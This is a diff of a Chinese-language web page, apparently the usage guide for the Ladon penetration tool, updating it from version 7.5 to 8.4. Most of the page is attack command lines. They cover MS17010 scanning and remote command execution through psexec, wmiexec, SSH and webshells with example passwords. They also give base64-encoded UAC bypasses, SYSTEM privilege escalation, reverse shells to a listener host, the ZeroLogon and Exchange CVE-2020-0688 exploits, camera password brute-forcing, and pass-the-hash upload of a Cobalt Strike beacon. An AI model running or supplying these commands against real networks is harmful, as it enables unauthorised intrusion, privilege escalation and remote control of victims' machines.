@@ -26,9 +26,7 @@
 
 
 
-
-前言本文仅是Ladon简单使用例子，Cobalt Strike、PowerShell、KaliLadon跨平台版等用法一致。
-完整文档：http://k8gege.org/Ladon...">
+前言Ladon 简明使用教程 完整文档: http://k8gege.org/Ladon支持Cmd、Shell、Cobalt Strike、PowerShell下使用Windows版本...">
 
 
 <meta name="robots" content="all">
@@ -170,12 +168,10 @@ Visit <span id="busuanzi_value_page_pv"></span>
 %>
 </%></p>
 
-
-<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文仅是Ladon简单使用例子，Cobalt Strike、PowerShell、KaliLadon跨平台版等用法一致。</p>
-<p>完整文档：<a href="http://k8gege.org/Ladon">http://k8gege.org/Ladon</a></p>
-<h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>Ladon7.5 20201010</p>
-<h3 id="Socks5代理扫描"><a href="#Socks5代理扫描" class="headerlink" title="Socks5代理扫描"></a>Socks5代理扫描</h3><p>例子：扫描目标10.1.2段是否存在MS17010漏洞（必须加noping）<br>Ladon noping 10.1.2.8/24 MS17010</p>
-<p>详见：<a href="http://k8gege.org/Ladon/proxy.html">http://k8gege.org/Ladon/proxy.html</a></p>
+<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Ladon 简明使用教程 完整文档: <a href="http://k8gege.org/Ladon">http://k8gege.org/Ladon</a><br>支持Cmd、Shell、Cobalt Strike、PowerShell下使用<br>Windows版本: .Net、Cobalt Strike、PowerShell<br>全系统版本：GO(全平台)、Python(理论上全平台)<br>PS: GUI版主要方便本地测试使用，完整功能使用CMD</p>
+<h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>Ladon8.4 2021.05.30<br>简明用法例子 113模块</p>
+<h3 id="自定义线程扫描"><a href="#自定义线程扫描" class="headerlink" title="自定义线程扫描"></a>自定义线程扫描</h3><p>例子：扫描目标10.1.2段是否存在MS17010漏洞（线程为1）<br>Ladon noping 10.1.2.8/24 MS17010 t=1<br>在高强度防护下的网络默认线程无法扫描，必须单线程</p>
+<h3 id="Socks5代理扫描"><a href="#Socks5代理扫描" class="headerlink" title="Socks5代理扫描"></a>Socks5代理扫描</h3><p>例子：扫描目标10.1.2段是否存在MS17010漏洞（必须加noping）<br>Ladon noping 10.1.2.8/24 MS17010<br>详见：<a href="http://k8gege.org/Ladon/proxy.html">http://k8gege.org/Ladon/proxy.html</a></p>
 <h3 id="网段扫描"><a href="#网段扫描" class="headerlink" title="网段扫描"></a>网段扫描</h3><p>CIDR格式：不只是/24/16/8(所有)<br>Ladon 192.168.1.8/24 扫描模块<br>Ladon 192.168.1.8/16 扫描模块<br>Ladon 192.168.1.8/8  扫描模块</p>
 <p>字母格式：仅C段B段A段 顺序排序<br>Ladon 192.168.1.8/c 扫描模块<br>Ladon 192.168.1.8/b 扫描模块<br>Ladon 192.168.1.8/a 扫描模块</p>
 <h3 id="资产扫描、指纹识别、服务识别、存活主机、端口扫描"><a href="#资产扫描、指纹识别、服务识别、存活主机、端口扫描" class="headerlink" title="资产扫描、指纹识别、服务识别、存活主机、端口扫描"></a>资产扫描、指纹识别、服务识别、存活主机、端口扫描</h3><h5 id="001-多协议探测存活主机-（IP、机器名、MAC地址、制造商）"><a href="#001-多协议探测存活主机-（IP、机器名、MAC地址、制造商）" class="headerlink" title="001 多协议探测存活主机 （IP、机器名、MAC地址、制造商）"></a>001 多协议探测存活主机 （IP、机器名、MAC地址、制造商）</h5><p>Ladon 192.168.1.8/24 OnlinePC</p>
@@ -237,21 +233,22 @@ Visit <span id="busuanzi_value_page_pv"></span>
 <h5 id="055-获取渗透基础信息"><a href="#055-获取渗透基础信息" class="headerlink" title="055 获取渗透基础信息"></a>055 获取渗透基础信息</h5><p>Ladon GetInfo<br>Ladon GetInfo2</p>
 <h5 id="056-NET-amp-PowerShell版本"><a href="#056-NET-amp-PowerShell版本" class="headerlink" title="056 .NET &amp; PowerShell版本"></a>056 .NET &amp; PowerShell版本</h5><p>Ladon NetVer<br>Ladon PSver<br>Ladon NetVersion<br>Ladon PSversion</p>
 <h5 id="057-运行时版本-amp-编译环境"><a href="#057-运行时版本-amp-编译环境" class="headerlink" title="057 运行时版本&amp;编译环境"></a>057 运行时版本&amp;编译环境</h5><p>Ladon Ver<br>Ladon Version</p>
-<h3 id="远程执行-psexec-wmiexec-atexec-sshexec"><a href="#远程执行-psexec-wmiexec-atexec-sshexec" class="headerlink" title="远程执行(psexec/wmiexec/atexec/sshexec)"></a>远程执行(psexec/wmiexec/atexec/sshexec)</h3><h5 id="445端口-PSEXEC远程执行命令（交互式）"><a href="#445端口-PSEXEC远程执行命令（交互式）" class="headerlink" title="445端口 PSEXEC远程执行命令（交互式）"></a>445端口 PSEXEC远程执行命令（交互式）</h5><p>net user \192.168.1.8 k8gege520 /user:k8gege<br>Ladon psexec 192.168.1.8<br>psexec&gt; whoami<br>nt authority\system</p>
-<h5 id="058-135端口-WmiExec远程执行命令-（非交互式）"><a href="#058-135端口-WmiExec远程执行命令-（非交互式）" class="headerlink" title="058 135端口 WmiExec远程执行命令 （非交互式）"></a>058 135端口 WmiExec远程执行命令 （非交互式）</h5><p>Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami</p>
+<h3 id="远程执行-psexec-wmiexec-atexec-sshexec"><a href="#远程执行-psexec-wmiexec-atexec-sshexec" class="headerlink" title="远程执行(psexec/wmiexec/atexec/sshexec)"></a>远程执行(psexec/wmiexec/atexec/sshexec)</h3><h5 id="445端口-加密PSEXEC远程执行命令（交互式）"><a href="#445端口-加密PSEXEC远程执行命令（交互式）" class="headerlink" title="445端口 加密PSEXEC远程执行命令（交互式）"></a>445端口 加密PSEXEC远程执行命令（交互式）</h5><p>net user \192.168.1.8 k8gege520 /user:k8gege<br>Ladon psexec 192.168.1.8<br>psexec&gt; whoami<br>nt authority\system</p>
+<h5 id="058-135端口-WmiExec远程执行命令-（非交互式）"><a href="#058-135端口-WmiExec远程执行命令-（非交互式）" class="headerlink" title="058 135端口 WmiExec远程执行命令 （非交互式）"></a>058 135端口 WmiExec远程执行命令 （非交互式）</h5><p>Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami  (8.2前用法)<br>Ladon wmiexec 192.168.1.8 k8gege k8gege520 cmd whoami  (8.2后用法)<br>Ladon wmiexec 192.168.1.8 k8gege k8gege520 b64cmd d2hvYW1p  (8.2后用法)</p>
 <h5 id="059-445端口-AtExec远程执行命令（非交互式）"><a href="#059-445端口-AtExec远程执行命令（非交互式）" class="headerlink" title="059 445端口 AtExec远程执行命令（非交互式）"></a>059 445端口 AtExec远程执行命令（非交互式）</h5><p>Ladon wmiexec 192.168.1.8 k8gege k8gege520 whoami</p>
 <h5 id="060-22端口-SshExec远程执行命令（非交互式）"><a href="#060-22端口-SshExec远程执行命令（非交互式）" class="headerlink" title="060 22端口 SshExec远程执行命令（非交互式）"></a>060 22端口 SshExec远程执行命令（非交互式）</h5><p>Ladon SshExec 192.168.1.8 k8gege k8gege520 whoami<br>Ladon SshExec 192.168.1.8 22 k8gege k8gege520 whoami</p>
 <h5 id="061-JspShell远程执行命令（非交互式）"><a href="#061-JspShell远程执行命令（非交互式）" class="headerlink" title="061 JspShell远程执行命令（非交互式）"></a>061 JspShell远程执行命令（非交互式）</h5><p>Usage：Ladon JspShell type url pwd cmd<br>Example: Ladon JspShell ua <a href="http://192.168.1.8/shell.jsp" target="_blank" rel="noopener">http://192.168.1.8/shell.jsp</a> Ladon whoami</p>
 <h4 id="062-WebShell远程执行命令（非交互式）"><a href="#062-WebShell远程执行命令（非交互式）" class="headerlink" title="062 WebShell远程执行命令（非交互式）"></a>062 WebShell远程执行命令（非交互式）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Usage：Ladon WebShell ScriptType ShellType url <span class="built_in">pwd</span> cmd</span><br><span class="line">Example: Ladon WebShell jsp ua http://192.168.1.8/shell.jsp Ladon whoami</span><br><span class="line">Example: Ladon WebShell aspx <span class="built_in">cd</span> http://192.168.1.8/1.aspx Ladon whoami</span><br><span class="line">Example: Ladon WebShell php ua http://192.168.1.8/1.php Ladon whoami</span><br></pre></td></tr></table></figure>
 
-<h3 id="提权降权"><a href="#提权降权" class="headerlink" title="提权降权"></a>提权降权</h3><h5 id="063-BypassUac-绕过UAC执行-支持Win7-Win10"><a href="#063-BypassUac-绕过UAC执行-支持Win7-Win10" class="headerlink" title="063 BypassUac 绕过UAC执行,支持Win7-Win10"></a>063 BypassUac 绕过UAC执行,支持Win7-Win10</h5><p>Ladon BypassUac c:\1.exe<br>Ladon BypassUac c:\1.bat</p>
+<h3 id="提权降权"><a href="#提权降权" class="headerlink" title="提权降权"></a>提权降权</h3><h5 id="063-BypassUac2-绕过UAC执行-支持Win7-Win10"><a href="#063-BypassUac2-绕过UAC执行-支持Win7-Win10" class="headerlink" title="063 BypassUac2 绕过UAC执行,支持Win7-Win10"></a>063 BypassUac2 绕过UAC执行,支持Win7-Win10</h5><p>Ladon BypassUac2 c:\1.exe<br>Ladon BypassUac2 c:\1.bat</p>
 <h5 id="064-GetSystem-提权或降权运行程序"><a href="#064-GetSystem-提权或降权运行程序" class="headerlink" title="064 GetSystem 提权或降权运行程序"></a>064 GetSystem 提权或降权运行程序</h5><p>Ladon GetSystem cmd.exe<br>Ladon GetSystem cmd.exe explorer</p>
 <h5 id="065-Runas-模拟用户执行命令"><a href="#065-Runas-模拟用户执行命令" class="headerlink" title="065 Runas 模拟用户执行命令"></a>065 Runas 模拟用户执行命令</h5><p>Ladon Runas user pass cmd</p>
 <h3 id="其它功能"><a href="#其它功能" class="headerlink" title="其它功能"></a>其它功能</h3><h5 id="066-Win2008一键启用-net-3-5"><a href="#066-Win2008一键启用-net-3-5" class="headerlink" title="066 Win2008一键启用.net 3.5"></a>066 Win2008一键启用.net 3.5</h5><p>Ladon EnableDotNet</p>
 <h5 id="067-获取内网站点HTML源码"><a href="#067-获取内网站点HTML源码" class="headerlink" title="067 获取内网站点HTML源码"></a>067 获取内网站点HTML源码</h5><p>Ladon gethtml <a href="http://192.168.1.1" target="_blank" rel="noopener">http://192.168.1.1</a></p>
 <h5 id="068-检测后门"><a href="#068-检测后门" class="headerlink" title="068 检测后门"></a>068 检测后门</h5><p>Ladon CheckDoor<br>Ladon AutoRun</p>
 <h5 id="069-获取本机内网IP与外网IP"><a href="#069-获取本机内网IP与外网IP" class="headerlink" title="069 获取本机内网IP与外网IP"></a>069 获取本机内网IP与外网IP</h5><p>Ladon GetIP</p>
-<h5 id="070-一键迷你WEB服务器"><a href="#070-一键迷你WEB服务器" class="headerlink" title="070 一键迷你WEB服务器"></a>070 一键迷你WEB服务器</h5><p>Ladon WebSer 80<br>Ladon web 80</p>
+<h5 id="070-一键迷你WEB服务器"><a href="#070-一键迷你WEB服务器" class="headerlink" title="070 一键迷你WEB服务器"></a>070 一键迷你WEB服务器</h5><p>Ladon WebSer 80<br>Ladon web 80<br>列目录<br>Ladon web 80 dir</p>
+<p>获取外网IP(VPS上启动WEB,目标访问ip.txt或ip.jpg)<br><a href="http://192.168.1.8/ip.txt" target="_blank" rel="noopener">http://192.168.1.8/ip.txt</a></p>
 <h3 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h3><h5 id="071-反弹TCP-NC-Shell"><a href="#071-反弹TCP-NC-Shell" class="headerlink" title="071 反弹TCP NC Shell"></a>071 反弹TCP NC Shell</h5><p>Ladon ReverseTcp 192.168.1.8 4444 nc</p>
 <h5 id="072-反弹TCP-MSF-Shell"><a href="#072-反弹TCP-MSF-Shell" class="headerlink" title="072 反弹TCP MSF Shell"></a>072 反弹TCP MSF Shell</h5><p>Ladon ReverseTcp 192.168.1.8 4444 shell</p>
 <h5 id="073-反弹TCP-MSF-MET-Shell"><a href="#073-反弹TCP-MSF-MET-Shell" class="headerlink" title="073 反弹TCP MSF MET Shell"></a>073 反弹TCP MSF MET Shell</h5><p>Ladon ReverseTcp 192.168.1.8 4444 meter</p>
@@ -282,8 +279,23 @@ Visit <span id="busuanzi_value_page_pv"></span>
 <p>提交 返回明文<br>certutil.exe -urlcache -split -f <a href="http://192.168.1.8:800/getstr/test123456" target="_blank" rel="noopener">http://192.168.1.8:800/getstr/test123456</a><br>Base64加密结果<br>certutil.exe -urlcache -split -f <a href="http://192.168.1.110:800/getbase64/k8gege520" target="_blank" rel="noopener">http://192.168.1.110:800/getbase64/k8gege520</a><br>Base64结果解密<br>certutil.exe -urlcache -split -f<a href="http://192.168.1.110:800/debase64/azhnZWdlNTIw" target="_blank" rel="noopener">http://192.168.1.110:800/debase64/azhnZWdlNTIw</a></p>
 <h5 id="098-ZeroLogon-CVE-2020-1472域控提权-密码置空"><a href="#098-ZeroLogon-CVE-2020-1472域控提权-密码置空" class="headerlink" title="098 ZeroLogon CVE-2020-1472域控提权(密码置空)"></a>098 ZeroLogon CVE-2020-1472域控提权(密码置空)</h5><p>Ladon ZeroLogon dc.k8gege.org</p>
 <h5 id="099-CVE-2020-0688-Exchange序列化漏洞-net-4-0"><a href="#099-CVE-2020-0688-Exchange序列化漏洞-net-4-0" class="headerlink" title="099 CVE-2020-0688 Exchange序列化漏洞(.net 4.0)"></a>099 CVE-2020-0688 Exchange序列化漏洞(.net 4.0)</h5><p>Ladon cve-2020-0688 192.168.1.142 Administrator K8gege520</p>
-<h5 id="100-自定义程序集插件扫描"><a href="#100-自定义程序集插件扫描" class="headerlink" title="100 自定义程序集插件扫描"></a>100 自定义程序集插件扫描</h5><p>Ladon 192.168.1.8/24 IsShiro.exe</p>
-<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>7.5版本：K8小密圈</p>
+<h5 id="100-Shiro插件探测"><a href="#100-Shiro插件探测" class="headerlink" title="100 Shiro插件探测"></a>100 Shiro插件探测</h5><p>Ladon 192.168.1.8/24 IsShiro</p>
+<h5 id="101-网络摄像头密码爆破-内置默认密码"><a href="#101-网络摄像头密码爆破-内置默认密码" class="headerlink" title="101 网络摄像头密码爆破(内置默认密码)"></a>101 网络摄像头密码爆破(内置默认密码)</h5><p>Ladon 192.168.1.8/24 DvrScan</p>
+<h5 id="102-Snmp协议探测操作系统、设备等信息"><a href="#102-Snmp协议探测操作系统、设备等信息" class="headerlink" title="102  Snmp协议探测操作系统、设备等信息"></a>102  Snmp协议探测操作系统、设备等信息</h5><p>Ladon 192.168.1.8/24 SnmpScan </p>
+<h5 id="103-Nbt协议探测Windows主机名、域、用户"><a href="#103-Nbt协议探测Windows主机名、域、用户" class="headerlink" title="103  Nbt协议探测Windows主机名、域、用户"></a>103  Nbt协议探测Windows主机名、域、用户</h5><p>Ladon 192.168.1.8/24 NbtInfo</p>
+<h5 id="104-Smb协议探测Windows版本、主机名、域"><a href="#104-Smb协议探测Windows版本、主机名、域" class="headerlink" title="104  Smb协议探测Windows版本、主机名、域"></a>104  Smb协议探测Windows版本、主机名、域</h5><p>Ladon 192.168.1.8/24 SmbInfo</p>
+<h5 id="105-Wmi协议探测Windows版本、主机名、域"><a href="#105-Wmi协议探测Windows版本、主机名、域" class="headerlink" title="105  Wmi协议探测Windows版本、主机名、域"></a>105  Wmi协议探测Windows版本、主机名、域</h5><p>Ladon 192.168.1.8/24 WmiInfo</p>
+<h5 id="106-Mssql协议探测Windows版本、主机名、域"><a href="#106-Mssql协议探测Windows版本、主机名、域" class="headerlink" title="106  Mssql协议探测Windows版本、主机名、域"></a>106  Mssql协议探测Windows版本、主机名、域</h5><p>Ladon 192.168.1.8/24 MssqlInfo</p>
+<h5 id="107-Winrm协议探测Windows版本、主机名、域"><a href="#107-Winrm协议探测Windows版本、主机名、域" class="headerlink" title="107  Winrm协议探测Windows版本、主机名、域"></a>107  Winrm协议探测Windows版本、主机名、域</h5><p>Ladon 192.168.1.8/24 WinrmInfo</p>
+<h5 id="108-Exchange探测Windows版本、主机名、域"><a href="#108-Exchange探测Windows版本、主机名、域" class="headerlink" title="108  Exchange探测Windows版本、主机名、域"></a>108  Exchange探测Windows版本、主机名、域</h5><p>Ladon 192.168.1.8/24 ExchangeInfo</p>
+<h5 id="109-Rdp协议探测Windows版本、主机名、域"><a href="#109-Rdp协议探测Windows版本、主机名、域" class="headerlink" title="109  Rdp协议探测Windows版本、主机名、域"></a>109  Rdp协议探测Windows版本、主机名、域</h5><p>Ladon 192.168.1.8/24 RdpInfo.ini</p>
+<h5 id="110-netsh本机888端口转发至112的22端口"><a href="#110-netsh本机888端口转发至112的22端口" class="headerlink" title="110  netsh本机888端口转发至112的22端口"></a>110  netsh本机888端口转发至112的22端口</h5><p>Ladon netsh add 888 192.168.1.112 22</p>
+<h5 id="111-列目录"><a href="#111-列目录" class="headerlink" title="111  列目录"></a>111  列目录</h5><p>Ladon DirList        默认列全盘<br>Ladon DirList c:\   指定盘符或目录</p>
+<h5 id="112-6种白名单BypassUAC-8-0后-Win7-Win10"><a href="#112-6种白名单BypassUAC-8-0后-Win7-Win10" class="headerlink" title="112  6种白名单BypassUAC(8.0后)Win7-Win10"></a>112  6种白名单BypassUAC(8.0后)Win7-Win10</h5><p>用法Ladon BypassUAC Method Base64Cmd</p>
+<p>Ladon BypassUAC eventvwr Y21kIC9jIHN0YXJ0IGNhbGMuZXhl<br>Ladon BypassUAC fodhelper Y21kIC9jIHN0YXJ0IGNhbGMuZXhl<br>Ladon BypassUAC computerdefaults Y21kIC9jIHN0YXJ0IGNhbGMuZXhl<br>Ladon BypassUAC sdclt Y21kIC9jIHN0YXJ0IGNhbGMuZXhl<br>Ladon BypassUAC slui Y21kIC9jIHN0YXJ0IGNhbGMuZXhl<br>Ladon BypassUAC dikcleanup Y21kIC9jIHN0YXJ0IGNhbGMuZXhlICYmIFJFTQ==</p>
+<h5 id="113-135端口-WmiExec2远程执行命令-（非交互式）支持文件上传"><a href="#113-135端口-WmiExec2远程执行命令-（非交互式）支持文件上传" class="headerlink" title="113 135端口 WmiExec2远程执行命令 （非交互式）支持文件上传"></a>113 135端口 WmiExec2远程执行命令 （非交互式）支持文件上传</h5><p>Usage:<br>Ladon WmiExec2 host user pass cmd whoami<br>Ladon WmiExec2 pth host cmd whoami<br>Base64Cmd for Cobalt Strike<br>Ladon WmiExec2 host user pass b64cmd dwBoAG8AYQBtAGkA<br>Ladon WmiExec2 host user pass b64cmd dwBoAG8AYQBtAGkA<br>Upload:<br>Ladon WmiExec2 host user pass upload beacon.exe ceacon.exe<br>Ladon WmiExec2 pth host upload beacon.exe ceacon.exe</p>
+<h5 id="自定义程序集插件扫描"><a href="#自定义程序集插件扫描" class="headerlink" title="自定义程序集插件扫描"></a>自定义程序集插件扫描</h5><p>Ladon 192.168.1.8/24 IsShiro.exe</p>
+<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>8.4版本：K8小密圈</p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
 <img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg">
 </div>
